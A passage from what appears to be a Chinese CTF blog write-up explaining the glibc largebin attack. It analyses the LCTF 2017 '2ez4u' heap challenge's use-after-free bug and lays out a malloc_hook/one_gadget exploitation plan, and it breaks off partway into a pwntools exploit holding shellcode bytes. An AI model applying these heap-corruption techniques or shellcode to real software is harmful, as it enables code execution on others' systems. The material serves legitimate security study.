(fwd));</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123; <span class="comment">//重点看插入中间的，这是纵向列表的指针插入</span></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                  &#125;</span><br><span class="line">                  bck = fwd-&gt;bk;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//这是横向列表的指针插入</span></span><br><span class="line">    mark_bin (av, victim_index);</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>这里没有什么检查，所以我们可以伪造一个largebin堆块的bk和bk_nextsize，然后在实现assert时，就会把我们伪造的地址看成堆块，并在fake_chunk的fd和fd_nextsize处写入堆地址。</p>
<h3 id="二、largebin的攻击原理"><a href="#二、largebin的攻击原理" class="headerlink" title="二、largebin的攻击原理"></a>二、largebin的攻击原理</h3><p>这里讲的是先部署好bk和bk_nextsize，当发生assert时，就会产生任意地址写堆地址的漏洞。</p>
<p>核心代码就是之前我们说的这个：p是第一个小于victim的堆块，bck是p的bk，所以链表关系是：</p>
<p>bck—&gt;victim—&gt;fwd，原始的横向列表和纵向列表都是bck—&gt;fwd，即：</p>
<p>bck = fwd–&gt;bk ,  bck=fwd–&gt;bk_nextsize</p>
<p>而我们要做的利用堆溢出或者UAF漏洞，修改fwd的bk和bk_nextsize为fake_chunk地址，看代码就可以知道：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//往victim-&gt;bk_nextsize写入fake_chunk地址</span></span><br><span class="line">     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//往fake_chunk的fd_nextsize写入assert的堆地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">victim-&gt;bk = bck;<span class="comment">//往victim-bk写入fake_chunk地址</span></span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;<span class="comment">//往fake_chunk的fd写入assert的堆地址</span></span><br></pre></td></tr></table></figure>

<p>所以就是通过修改fwd的bk和bk_nextsize，造成任意地址的fd和fd_nextsize写堆地址的漏洞。这个和unsortedbin attack有点像，但是又不同。</p>
<p>用how2heap的那个例子看看：</p>
<p><img src="/blog_img/1570527425526.png" alt="57052742552"></p>
<p>一波伪造，使得0x602840的size为0x3f1，目的是让largebin插进来时，正好在0x602840和0x602840的bk之间，修改0x602840的bk为栈地址，0x602840的bk_nextsize也是栈地址，第一步修改成功了，接着让largebin进来：</p>
<p><img src="/blog_img/1570527642802.png" alt="57052764280"></p>
<p>可以看到fd的位置(0x7fffffffdcc0)写入了堆地址，fd_nextsize的位置(0x7fffffffdcd0)也写入了堆地址，验证完毕。</p>
<h3 id="三、题目演示"><a href="#三、题目演示" class="headerlink" title="三、题目演示"></a>三、题目演示</h3><h4 id="LCTF-2ez4u-2017"><a href="#LCTF-2ez4u-2017" class="headerlink" title="LCTF - 2ez4u 2017"></a>LCTF - 2ez4u 2017</h4><p><img src="/blog_img/1570698921657.png" alt="57069892165"></p>
<p>保护全开，习惯就好，ida继续分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_1232</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read_0();</span><br><span class="line">    <span class="keyword">switch</span> ( &amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        malloc_0();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        free_0();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        show_0();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invalid choice !"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>熟悉的菜单题，一个个看功能：</p>
<p>malloc:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">malloc_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  _QWORD *chunk; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( unk_202140 == <span class="number">16</span> )<span class="comment">//堆块个数最大16</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"sorry XD"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"color?(0:red, 1:green):"</span>);</span><br><span class="line">    v2 = read_0();</span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">1</span> &amp;&amp; v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"value?(0-999):"</span>);</span><br><span class="line">      v3 = read_0();</span><br><span class="line">      <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x3E7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"num?(0-16):"</span>);</span><br><span class="line">        v4 = read_0();</span><br><span class="line">        <span class="keyword">if</span> ( v4 &lt;= <span class="number">0x10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"description length?(1-1024):"</span>);</span><br><span class="line">          <span class="built_in">size</span> = read_0();</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">size</span> &lt;= <span class="number">0x400</span> &amp;&amp; <span class="built_in">size</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            chunk = <span class="built_in">malloc</span>(<span class="built_in">size</span> + <span class="number">0x18</span>LL);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"description of the apple:"</span>);</span><br><span class="line">            read_1((chunk + <span class="number">3</span>), <span class="built_in">size</span>, <span class="number">10</span>);<span class="comment">//description</span></span><br><span class="line">            *chunk = v2;<span class="comment">//color</span></span><br><span class="line">            chunk[<span class="number">1</span>] = v3;<span class="comment">//value</span></span><br><span class="line">            *(chunk + <span class="number">1</span>) = v4;<span class="comment">//num</span></span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( !LODWORD(qword_202040[<span class="number">2</span> * i]) )<span class="comment">//标志位为0就可以拿来用，index也会成为新的。</span></span><br><span class="line">              &#123;</span><br><span class="line">                *(chunk + <span class="number">4</span>) = i;</span><br><span class="line">                qword_202040[<span class="number">2</span> * i + <span class="number">1</span>] = chunk;</span><br><span class="line">                HIDWORD(qword_202040[<span class="number">2</span> * i]) = <span class="built_in">size</span>;</span><br><span class="line">                LODWORD(qword_202040[<span class="number">2</span> * i]) = <span class="number">1</span>;<span class="comment">//低字节存使用标志位，和堆的管理一样，节省空间</span></span><br><span class="line">                ++unk_202140;<span class="comment">//数量</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"apple index: %d\n"</span>, i);</span><br><span class="line">                <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"???"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以知道申请的chunk最大为0x400，但是每一次申请都会加0x18，所以最大是0x418的chunk，已经到达了largebin的范围。这里可以清楚地看到堆块的布局：</p>
<p><img src="/blog_img/1570699968433.png" alt="57069950380"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struck  chunk</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> <span class="built_in">size</span>；</span><br><span class="line">   <span class="keyword">int</span> color；<span class="comment">//4</span></span><br><span class="line">   <span class="keyword">int</span> value；<span class="comment">//4</span></span><br><span class="line">   <span class="keyword">int</span> num；<span class="comment">//8</span></span><br><span class="line">   <span class="keyword">int</span> index；<span class="comment">//8</span></span><br><span class="line">   <span class="keyword">char</span> content[<span class="built_in">size</span><span class="number">-0x18</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显，这个0x18是用来隔开输入的，这样FD和BK就不能控制了，作者这一步还是挺好的，但是我们可以利用unsortedbin的切割，后面再讲，继续分析：</p>
<p><img src="/blog_img/1570699722738.png" alt="57069972273"></p>
<p>这是read函数，可以看到输入中，如果是回车，则变成\x00，输入结束后把末尾置为0截断，如果不输入也还是置为0，没有offbynull，多了个0截断。</p>
<p>free：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_E57</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"which?(0-15):"</span>);</span><br><span class="line">  idx = read_0();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span> &amp;&amp; LODWORD(qword_202040[<span class="number">2</span> * idx]) )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(qword_202040[<span class="number">2</span> * idx]) = <span class="number">0</span>;  <span class="comment">//标志位清0，无法double free</span></span><br><span class="line">    <span class="built_in">free</span>(qword_202040[<span class="number">2</span> * idx + <span class="number">1</span>]);  <span class="comment">//UAF</span></span><br><span class="line">    --unk_202140;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"???"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_F19</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"which?(0-15):"</span>);</span><br><span class="line">  idx = read_0();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span> &amp;&amp; qword_202040[<span class="number">2</span> * idx + <span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"color?(0:red, 1:green):"</span>);</span><br><span class="line">    v2 = read_0();</span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">1</span> &amp;&amp; v2 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      *qword_202040[<span class="number">2</span> * idx + <span class="number">1</span>] = v2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"value?(0-999):"</span>);</span><br><span class="line">    v3 = read_0();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x3E7</span> )</span><br><span class="line">      *(qword_202040[<span class="number">2</span> * idx + <span class="number">1</span>] + <span class="number">1</span>) = v3;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"num?(0-16):"</span>);</span><br><span class="line">    v4 = read_0();</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">0x10</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * idx + <span class="number">1</span>][<span class="number">1</span>] = v4;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"new description of the apple:"</span>);</span><br><span class="line">    read_1((qword_202040[<span class="number">2</span> * idx + <span class="number">1</span>] + <span class="number">6</span>), HIDWORD(qword_202040[<span class="number">2</span> * idx]), <span class="number">10</span>);</span><br><span class="line">      <span class="comment">//漏洞点，根据下标去索引，而下标是没有被清空的，结合UAF漏洞，即可实现Free堆块的edit，就会有溢出的产生</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后是show函数：</p>
<p><img src="/blog_img/1570700615366.png" alt="57070061536"></p>
<p>正常打印，但是只有descrition的大小才够打出我们需要的地址来。这道题到这里就分析完了：</p>
<p>1、有UAF漏洞，有可以edit一个free掉的堆块（利用index更新机制）</p>
<p>2、利用unsortedbin中相邻物理地址的堆块合并(向前合并)，假设有0x100的chunk1和chunk2，都free掉，我们可以得到一个chunk0(0x200)，这里再次申请chunk3(0x110)，就会把main_arena+88的真实地址写入到free的chunk2的description中，然后我们再show下chunk2的内容，就可以得到真实地址。</p>
<p>3、如果我们有chunk0(0x20)—&gt;chunk1(0x20)—&gt;chunk2(0x120)，free2，再free0，再free1，毫无疑问，下一次申请chunk4(0x90)和chunk5(0x50)还是切割chunk2，但是下标变成了0和1，而我们利用第一点，edit下我们的2号块，size是0x120，就可以实现任意写chunk4和chunk5。FD指针和BK指针都可以控制了。</p>
<p>接下来用2种方法做这道题：</p>
<p>第一种是fastbin attack+unsourtedbin attack：</p>
<p>第二种是largebin attack</p>
<p>第一种方法，泄露了地址后，利用unsorted bin去攻击malloc_hook-0x50，从而在malloc_hook-0x40写入了main_arena+88真实地址，所以在malloc_hook-0x43处会有0x7f的size头可以构造fake_chunk，利用edit去写FD伪造，申请出来就是常规写onegadget的操作了。之所以这样就是因为写入description要隔开0x18的大小，所以之前malloc_hook-0x23的位置没有用了，得自己构造，这样写入的偏移还是0x13，这里直接上exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./2ez4u'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./2ez4u'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'192.168.100.20'</span>,<span class="number">50005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"><span class="comment"># payload32 = fmtstr_payload(offset ，&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' </span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = 